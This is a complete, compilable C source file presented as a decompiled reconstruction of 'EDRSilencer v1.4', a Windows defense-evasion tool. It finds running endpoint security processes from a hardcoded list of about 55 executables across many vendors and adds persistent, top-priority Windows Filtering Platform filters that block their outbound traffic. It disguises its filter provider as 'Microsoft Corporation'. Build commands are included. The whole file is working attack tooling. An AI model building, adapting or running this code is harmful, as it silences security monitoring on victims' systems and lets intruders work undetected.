/*
 * EDRSilencer v1.4 — Reconstructed source code
 * Decompiled from EDRSilencer.exe (PE32+ x86-64, MinGW GCC, compiled 2024-11-03)
 *
 * This tool uses the Windows Filtering Platform (WFP) API to add outbound
 * network block filters targeting EDR (Endpoint Detection & Response) processes.
 * It does NOT kill or inject into processes — it silences their network comms.
 *
 * Compile with MinGW-w64:
 *   x86_64-w64-mingw32-gcc -o EDRSilencer.exe EDRSilencer_decompiled.c \
 *       -lfwpuclnt -ladvapi32 -lkernel32
 *
 * Compile with MSVC (Developer Command Prompt):
 *   cl /W3 /Fe:EDRSilencer.exe EDRSilencer_decompiled.c \
 *       fwpuclnt.lib advapi32.lib kernel32.lib
 */

#include <windows.h>
#include <fwpmu.h>
#include <fwpmtypes.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

/* Link libraries (MSVC) */
#ifdef _MSC_VER
#pragma comment(lib, "fwpuclnt.lib")
#pragma comment(lib, "advapi32.lib")
#endif

/* ============================================================
 * Custom provider GUID — extracted from the binary.
 * The tool registers this GUID as its WFP provider so that
 * unblockall can later enumerate and remove only its own filters.
 * ============================================================ */
// {C38D57D1-05A7-4C33-904F-7FBCEEE60E82}
static const GUID EDRSILENCER_PROVIDER_GUID = {
    0xC38D57D1, 0x05A7, 0x4C33,
    { 0x90, 0x4F, 0x7F, 0xBC, 0xEE, 0xE6, 0x0E, 0x82 }
};

/* ============================================================
 * EDR Process Target List — 55 executables across 16+ vendors
 * ============================================================ */
static const char* edrProcess[] = {
    /* Microsoft Defender */
    "MsMpEng.exe",
    "MsSense.exe",
    "SenseIR.exe",
    "SenseNdr.exe",
    "SenseCncProxy.exe",
    "SenseSampleUploader.exe",

    /* Elastic Security */
    "winlogbeat.exe",
    "elastic-agent.exe",
    "elastic-endpoint.exe",
    "filebeat.exe",

    /* Trellix (FireEye) */
    "xagt.exe",

    /* Qualys */
    "QualysAgent.exe",

    /* SentinelOne */
    "SentinelAgent.exe",
    "SentinelAgentWorker.exe",
    "SentinelServiceHost.exe",
    "SentinelStaticEngine.exe",
    "LogProcessorService.exe",
    "SentinelStaticEngineScanner.exe",
    "SentinelHelperService.exe",
    "SentinelBrowserNativeHost.exe",

    /* Cylance / BlackBerry */
    "CylanceSvc.exe",

    /* Cisco Secure Endpoint (AMP) */
    "AmSvc.exe",
    "CrAmTray.exe",
    "CrsSvc.exe",
    "ExecutionPreventionSvc.exe",

    /* Cybereason */
    "CybereasonAV.exe",

    /* Carbon Black (VMware) */
    "cb.exe",
    "RepMgr.exe",
    "RepUtils.exe",
    "RepUx.exe",
    "RepWAV.exe",
    "RepWSC.exe",

    /* Tanium */
    "TaniumClient.exe",
    "TaniumCX.exe",
    "TaniumDetectEngine.exe",

    /* Palo Alto Cortex XDR / Traps */
    "Traps.exe",
    "cyserver.exe",
    "CyveraService.exe",
    "CyvrFsFlt.exe",

    /* FortiEDR */
    "fortiedr.exe",

    /* Windows SFC */
    "sfc.exe",

    /* ESET */
    "EIConnector.exe",
    "ekrn.exe",

    /* Harfanglab */
    "hurukai.exe",

    /* Broadcom / Symantec */
    "CETASvc.exe",
    "WSCommunicator.exe",
    "EndpointBasecamp.exe",

    /* Trend Micro */
    "TmListen.exe",
    "Ntrtscan.exe",
    "TmWSCSvc.exe",
    "PccNTMon.exe",
    "TMBMSRV.exe",
    "CNTAoSMgr.exe",
    "TmCCSF.exe",
};

#define EDR_PROCESS_COUNT (sizeof(edrProcess) / sizeof(edrProcess[0]))

/* Display strings — the tool masquerades as a Microsoft built-in provider */
static const WCHAR* PROVIDER_NAME        = L"Microsoft Corporation";
static const WCHAR* PROVIDER_DESCRIPTION  = L"Microsoft Windows WFP Built-in custom provider.";
static const WCHAR* FILTER_NAME           = L"Custom Outbound Filter";


/* ============================================================
 * Forward declarations
 * ============================================================ */
static void   print_usage(void);
static BOOL   IsRunningAsAdmin(void);
static BOOL   EnableDebugPrivilege(void);
static DWORD  CustomFwpmGetAppIdFromFileName0(LPCWSTR filePath, FWP_BYTE_BLOB** appId);
static DWORD  add_wfp_block_filter(HANDLE engineHandle, LPCWSTR appPath);
static DWORD  blockedr(void);
static DWORD  block_single(const char* processPath);
static DWORD  unblockall(void);
static DWORD  unblock_single(UINT64 filterId);


/* ============================================================
 * main — Parse arguments and dispatch to subcommands
 * ============================================================ */
int main(int argc, char* argv[])
{
    if (!IsRunningAsAdmin()) {
        return 1;
    }

    EnableDebugPrivilege();

    if (argc < 2) {
        print_usage();
        return 1;
    }

    if (strcmp(argv[1], "--help") == 0) {
        print_usage();
        return 0;
    }

    if (strcmp(argv[1], "blockedr") == 0) {
        return (int)blockedr();
    }

    if (strcmp(argv[1], "block") == 0) {
        if (argc < 3) {
            fprintf(stderr,
                "[-] Missing second argument. "
                "Please provide the full path of the process to block.\n");
            return 1;
        }
        return (int)block_single(argv[2]);
    }

    if (strcmp(argv[1], "unblockall") == 0) {
        return (int)unblockall();
    }

    if (strcmp(argv[1], "unblock") == 0) {
        if (argc < 3) {
            fprintf(stderr,
                "[-] Missing argument for 'unblock' command. "
                "Please provide the filter id.\n");
            return 1;
        }
        char* endptr;
        errno = 0;
        unsigned long long filter_id = strtoull(argv[2], &endptr, 10);
        if (errno != 0) {
            fprintf(stderr, "[-] strtoull failed with error code: 0x%x.\n", errno);
            return 1;
        }
        if (*endptr != '\0') {
            fprintf(stderr, "[-] Please provide filter id in digits.\n");
            return 1;
        }
        return (int)unblock_single((UINT64)filter_id);
    }

    fprintf(stderr, "[-] Invalid argument: \"%s\".\n", argv[1]);
    return 1;
}


/* ============================================================
 * print_usage
 * ============================================================ */
static void print_usage(void)
{
    printf("Usage: EDRSilencer.exe <blockedr/block/unblockall/unblock>\n");
    printf("Version: 1.4\n\n");
    printf("- Add WFP filters to block the IPv4 and IPv6 outbound traffic "
           "of all detected EDR processes:\n");
    printf("  EDRSilencer.exe blockedr\n\n");
    printf("- Add WFP filters to block the IPv4 and IPv6 outbound traffic "
           "of a specific process (full path is required):\n");
    printf("  EDRSilencer.exe block \"C:\\Windows\\System32\\curl.exe\"\n\n");
    printf("- Remove all WFP filters applied by this tool:\n");
    printf("  EDRSilencer.exe unblockall\n\n");
    printf("- Remove a specific WFP filter based on filter id:\n");
    printf("  EDRSilencer.exe unblock <filter id>\n");
}


/* ============================================================
 * IsRunningAsAdmin — Check for BUILTIN\Administrators membership
 * Uses GetSidSubAuthority to walk token groups looking for RID 544.
 * ============================================================ */
static BOOL IsRunningAsAdmin(void)
{
    HANDLE hToken = NULL;

    /* Try thread token first (impersonation), fall back to process token */
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken)) {
        fprintf(stderr, "[-] OpenThreadToken failed with error code: 0x%x.\n",
                (unsigned int)GetLastError());
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            fprintf(stderr, "[-] OpenProcessToken failed with error code: 0x%x.\n",
                    (unsigned int)GetLastError());
            return FALSE;
        }
    }

    /* Query token group memberships */
    DWORD size = 0;
    GetTokenInformation(hToken, TokenGroups, NULL, 0, &size);

    TOKEN_GROUPS* groups = (TOKEN_GROUPS*)LocalAlloc(LMEM_FIXED, size);
    if (groups == NULL) {
        CloseHandle(hToken);
        return FALSE;
    }

    if (!GetTokenInformation(hToken, TokenGroups, groups, size, &size)) {
        fprintf(stderr, "[-] GetTokenInformation failed with error code: 0x%x.\n",
                (unsigned int)GetLastError());
        LocalFree(groups);
        CloseHandle(hToken);
        return FALSE;
    }

    /* Walk groups looking for BUILTIN\Administrators (S-1-5-32-544) */
    BOOL isAdmin = FALSE;
    for (DWORD i = 0; i < groups->GroupCount; i++) {
        PSID sid = groups->Groups[i].Sid;
        PUCHAR subAuthCount = GetSidSubAuthorityCount(sid);
        if (*subAuthCount >= 2) {
            PDWORD rid = GetSidSubAuthority(sid, (DWORD)(*subAuthCount - 1));
            if (*rid == DOMAIN_ALIAS_RID_ADMINS) {   /* 544 */
                isAdmin = TRUE;
                break;
            }
        }
    }

    LocalFree(groups);
    CloseHandle(hToken);
    return isAdmin;
}


/* ============================================================
 * EnableDebugPrivilege — Enable SeDebugPrivilege so we can
 * call OpenProcess/QueryFullProcessImageNameW on EDR processes.
 * ============================================================ */
static BOOL EnableDebugPrivilege(void)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD err = GetLastError();
    CloseHandle(hToken);
    return (err == ERROR_SUCCESS);
}


/* ============================================================
 * CustomFwpmGetAppIdFromFileName0
 *
 * Converts a Win32 path like "C:\Windows\System32\foo.exe"
 * into WFP's NT device path format:
 *   "\device\harddiskvolume3\windows\system32\foo.exe"
 *
 * WFP requires the path in lowercase NT device format for
 * FWPM_CONDITION_ALE_APP_ID matching.
 * ============================================================ */
static DWORD CustomFwpmGetAppIdFromFileName0(LPCWSTR filePath, FWP_BYTE_BLOB** appId)
{
    /* Validate the file exists */
    if (GetFileAttributesW(filePath) == INVALID_FILE_ATTRIBUTES) {
        fwprintf(stderr,
            L"[-] CustomFwpmGetAppIdFromFileName0 failed to convert "
            L"the \"%s\" to app ID format. The file path cannot be found.\n",
            filePath);
        return ERROR_FILE_NOT_FOUND;
    }

    /* Validate path format (must have drive letter + colon) */
    if (filePath[0] == L'\0' || filePath[1] != L':') {
        fwprintf(stderr,
            L"[-] CustomFwpmGetAppIdFromFileName0 failed to convert "
            L"the \"%s\" to app ID format. Please check your input.\n",
            filePath);
        return ERROR_BAD_PATHNAME;
    }

    /* Extract drive letter portion "X:" */
    WCHAR drive[3] = { filePath[0], L':', L'\0' };

    /* Query the NT device path for this drive letter
     * e.g. "C:" -> "\Device\HarddiskVolume3" */
    WCHAR dosDevice[MAX_PATH];
    if (QueryDosDeviceW(drive, dosDevice, MAX_PATH) == 0) {
        fwprintf(stderr,
            L"[-] CustomFwpmGetAppIdFromFileName0 failed to convert "
            L"the \"%s\" to app ID format. The drive name cannot be found.\n",
            filePath);
        return ERROR_BAD_PATHNAME;
    }

    /* Build the full NT path: \Device\HarddiskVolumeN\rest\of\path */
    WCHAR ntPath[MAX_PATH * 2];
    _snwprintf(ntPath, MAX_PATH * 2, L"%ls%ls", dosDevice, filePath + 2);
    ntPath[(MAX_PATH * 2) - 1] = L'\0';

    /* WFP matching requires lowercase */
    _wcslwr(ntPath);

    /* Allocate the FWP_BYTE_BLOB with the path data inline after the struct */
    DWORD blobSize = (DWORD)((wcslen(ntPath) + 1) * sizeof(WCHAR));
    FWP_BYTE_BLOB* blob = (FWP_BYTE_BLOB*)LocalAlloc(LMEM_FIXED,
                                                       sizeof(FWP_BYTE_BLOB) + blobSize);
    if (blob == NULL) {
        fwprintf(stderr,
            L"[-] CustomFwpmGetAppIdFromFileName0 failed to convert "
            L"the \"%s\" to app ID format. "
            L"Error occurred in allocating memory for appId.\n",
            filePath);
        return ERROR_OUTOFMEMORY;
    }

    blob->size = blobSize;
    blob->data = (UINT8*)blob + sizeof(FWP_BYTE_BLOB);
    memcpy(blob->data, ntPath, blobSize);

    *appId = blob;
    return ERROR_SUCCESS;
}


/* ============================================================
 * add_wfp_block_filter
 *
 * Core blocking logic. For a given application path:
 *   1. Converts path to WFP app ID format
 *   2. Registers a custom WFP provider (idempotent)
 *   3. Adds an outbound BLOCK filter on the IPv4 ALE connect layer
 *   4. Adds an outbound BLOCK filter on the IPv6 ALE connect layer
 *
 * Both filters use weight 0xFFFFFFFFFFFFFFFF (max priority) and
 * FWPM_SUBLAYER_UNIVERSAL so they take precedence over other rules.
 * ============================================================ */
static DWORD add_wfp_block_filter(HANDLE engineHandle, LPCWSTR appPath)
{
    DWORD result;
    FWP_BYTE_BLOB* appId = NULL;

    result = CustomFwpmGetAppIdFromFileName0(appPath, &appId);
    if (result != ERROR_SUCCESS)
        return result;

    /* ---- Register the custom WFP provider ---- */
    FWPM_PROVIDER0 provider;
    memset(&provider, 0, sizeof(provider));

    provider.providerKey            = EDRSILENCER_PROVIDER_GUID;
    provider.displayData.name       = (PWSTR)PROVIDER_NAME;
    provider.displayData.description = (PWSTR)PROVIDER_DESCRIPTION;
    provider.flags                  = FWPM_PROVIDER_FLAG_PERSISTENT;

    result = FwpmProviderAdd0(engineHandle, &provider, NULL);
    if (result != ERROR_SUCCESS && result != (DWORD)FWP_E_ALREADY_EXISTS) {
        fprintf(stderr, "[-] FwpmProviderAdd0 failed with error code: 0x%x.\n",
                (unsigned int)result);
        LocalFree(appId);
        return result;
    }

    /* ---- Build the filter condition: match on application ID ---- */
    FWPM_FILTER_CONDITION0 cond;
    memset(&cond, 0, sizeof(cond));

    cond.fieldKey                  = FWPM_CONDITION_ALE_APP_ID;
    cond.matchType                 = FWP_MATCH_EQUAL;
    cond.conditionValue.type       = FWP_BYTE_BLOB_TYPE;
    cond.conditionValue.byteBlob   = appId;

    /* ---- IPv4 outbound block filter ---- */
    FWPM_FILTER0 filter;
    memset(&filter, 0, sizeof(filter));

    filter.displayData.name     = (PWSTR)FILTER_NAME;
    filter.layerKey             = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
    filter.action.type          = FWP_ACTION_BLOCK;
    filter.subLayerKey          = FWPM_SUBLAYER_UNIVERSAL;
    filter.weight.type          = FWP_UINT64;
    filter.weight.uint64        = &(UINT64){ 0xFFFFFFFFFFFFFFFF };
    filter.providerKey          = (GUID*)&EDRSILENCER_PROVIDER_GUID;
    filter.numFilterConditions  = 1;
    filter.filterCondition      = &cond;
    filter.flags                = FWPM_FILTER_FLAG_PERSISTENT;

    UINT64 filterId = 0;
    result = FwpmFilterAdd0(engineHandle, &filter, NULL, &filterId);
    if (result == ERROR_SUCCESS) {
        wprintf(L"    Added WFP filter for \"%s\" (Filter id: %llu, IPv4 layer).\n",
                appPath, (unsigned long long)filterId);
    } else {
        fprintf(stderr,
            "    [-] Failed to add filter in IPv4 layer with error code: 0x%x.\n",
            (unsigned int)result);
    }

    /* ---- IPv6 outbound block filter ---- */
    filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;

    result = FwpmFilterAdd0(engineHandle, &filter, NULL, &filterId);
    if (result == ERROR_SUCCESS) {
        wprintf(L"    Added WFP filter for \"%s\" (Filter id: %llu, IPv6 layer).\n",
                appPath, (unsigned long long)filterId);
    } else {
        fprintf(stderr,
            "    [-] Failed to add filter in IPv6 layer with error code: 0x%x.\n",
            (unsigned int)result);
    }

    LocalFree(appId);
    return ERROR_SUCCESS;
}


/* ============================================================
 * blockedr — Auto-detect and block all running EDR processes
 *
 * Enumerates all running processes via CreateToolhelp32Snapshot,
 * matches against the hardcoded edrProcess[] list (case-insensitive),
 * then resolves each match's full image path and adds WFP block filters.
 * ============================================================ */
static DWORD blockedr(void)
{
    HANDLE engineHandle = NULL;
    DWORD result;

    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &engineHandle);
    if (result != ERROR_SUCCESS) {
        fprintf(stderr, "[-] FwpmEngineOpen0 failed with error code: 0x%x.\n",
                (unsigned int)result);
        return result;
    }

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        fprintf(stderr,
            "[-] CreateToolhelp32Snapshot (of processes) failed "
            "with error code: 0x%x.\n",
            (unsigned int)GetLastError());
        FwpmEngineClose0(engineHandle);
        return 1;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        fprintf(stderr, "[-] Process32First failed with error code: 0x%x.\n",
                (unsigned int)GetLastError());
        CloseHandle(hSnapshot);
        FwpmEngineClose0(engineHandle);
        return 1;
    }

    BOOL foundEDR = FALSE;

    do {
        for (int i = 0; i < (int)EDR_PROCESS_COUNT; i++) {
            if (_stricmp(pe32.szExeFile, edrProcess[i]) == 0) {
                foundEDR = TRUE;

                printf("Detected running EDR process: %s (%d):\n",
                       pe32.szExeFile, (int)pe32.th32ProcessID);

                /* Open the process to query its full image path */
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
                                              FALSE, pe32.th32ProcessID);
                if (hProcess == NULL) {
                    fprintf(stderr,
                        "    [-] Could not open process \"%s\" "
                        "with error code: 0x%x.\n",
                        pe32.szExeFile, (unsigned int)GetLastError());
                    continue;
                }

                WCHAR imagePath[MAX_PATH];
                DWORD pathSize = MAX_PATH;
                QueryFullProcessImageNameW(hProcess, 0, imagePath, &pathSize);
                CloseHandle(hProcess);

                add_wfp_block_filter(engineHandle, imagePath);
                break;  /* Move to next process in snapshot */
            }
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);

    if (!foundEDR) {
        fprintf(stderr,
            "[-] No EDR process was detected. Please double check "
            "the edrProcess list or add the filter manually using "
            "'block' command.\n");
    }

    FwpmEngineClose0(engineHandle);
    return 0;
}


/* ============================================================
 * block_single — Block a specific process by its full file path
 * ============================================================ */
static DWORD block_single(const char* processPath)
{
    HANDLE engineHandle = NULL;
    DWORD result;

    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &engineHandle);
    if (result != ERROR_SUCCESS) {
        fprintf(stderr, "[-] FwpmEngineOpen0 failed with error code: 0x%x.\n",
                (unsigned int)result);
        return result;
    }

    /* Convert the ANSI path to wide chars */
    WCHAR wPath[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, processPath, -1, wPath, MAX_PATH);

    add_wfp_block_filter(engineHandle, wPath);

    FwpmEngineClose0(engineHandle);
    return 0;
}


/* ============================================================
 * unblockall — Remove ALL WFP filters created by this tool
 *
 * Enumerates filters by the custom provider GUID, deletes each one,
 * then removes the provider registration itself.
 * ============================================================ */
static DWORD unblockall(void)
{
    HANDLE engineHandle = NULL;
    DWORD result;

    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &engineHandle);
    if (result != ERROR_SUCCESS) {
        fprintf(stderr, "[-] FwpmEngineOpen0 failed with error code: 0x%x.\n",
                (unsigned int)result);
        return result;
    }

    /* Set up enumeration by our provider GUID */
    FWPM_FILTER_ENUM_TEMPLATE0 enumTemplate;
    memset(&enumTemplate, 0, sizeof(enumTemplate));
    enumTemplate.providerKey = (GUID*)&EDRSILENCER_PROVIDER_GUID;

    HANDLE enumHandle = NULL;
    result = FwpmFilterCreateEnumHandle0(engineHandle, &enumTemplate, &enumHandle);
    if (result != ERROR_SUCCESS) {
        fprintf(stderr,
            "[-] FwpmFilterCreateEnumHandle0 failed with error code: 0x%x.\n",
            (unsigned int)result);
        FwpmEngineClose0(engineHandle);
        return result;
    }

    FWPM_FILTER0** filters = NULL;
    UINT32 numFilters = 0;

    result = FwpmFilterEnum0(engineHandle, enumHandle, INFINITE, &filters, &numFilters);
    if (result != ERROR_SUCCESS) {
        fprintf(stderr, "[-] FwpmFilterEnum0 failed with error code: 0x%x.\n",
                (unsigned int)result);
        FwpmFilterDestroyEnumHandle0(engineHandle, enumHandle);
        FwpmEngineClose0(engineHandle);
        return result;
    }

    if (numFilters == 0) {
        fprintf(stderr, "[-] Unable to find any WFP filter created by this tool.\n");
    } else {
        /* Delete each filter */
        for (UINT32 i = 0; i < numFilters; i++) {
            result = FwpmFilterDeleteById0(engineHandle, filters[i]->filterId);
            if (result == ERROR_SUCCESS) {
                printf("Deleted filter id: %llu.\n",
                       (unsigned long long)filters[i]->filterId);
            } else {
                fprintf(stderr,
                    "[-] Failed to delete filter id: %llu with error code: 0x%x.\n",
                    (unsigned long long)filters[i]->filterId, (unsigned int)result);
            }
        }

        /* Remove the custom provider */
        result = FwpmProviderDeleteByKey0(engineHandle,
                                          (GUID*)&EDRSILENCER_PROVIDER_GUID);
        if (result == ERROR_SUCCESS) {
            printf("Deleted custom WFP provider.\n");
        } else {
            fprintf(stderr,
                "[-] FwpmProviderDeleteByKey0 failed with error code: 0x%x.\n",
                (unsigned int)result);
        }
    }

    FwpmFreeMemory0((void**)&filters);
    FwpmFilterDestroyEnumHandle0(engineHandle, enumHandle);
    FwpmEngineClose0(engineHandle);
    return 0;
}


/* ============================================================
 * unblock_single — Remove a specific WFP filter by its numeric ID
 * ============================================================ */
static DWORD unblock_single(UINT64 filterId)
{
    HANDLE engineHandle = NULL;
    DWORD result;

    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &engineHandle);
    if (result != ERROR_SUCCESS) {
        fprintf(stderr, "[-] FwpmEngineOpen0 failed with error code: 0x%x.\n",
                (unsigned int)result);
        return result;
    }

    result = FwpmFilterDeleteById0(engineHandle, filterId);
    if (result == ERROR_SUCCESS) {
        printf("Deleted filter id: %llu.\n", (unsigned long long)filterId);
    } else if (result == (DWORD)FWP_E_FILTER_NOT_FOUND) {
        fprintf(stderr, "[-] The filter does not exist.\n");
    } else {
        fprintf(stderr,
            "[-] Failed to delete filter id: %llu with error code: 0x%x.\n",
            (unsigned long long)filterId, (unsigned int)result);
    }

    FwpmEngineClose0(engineHandle);
    return 0;
}
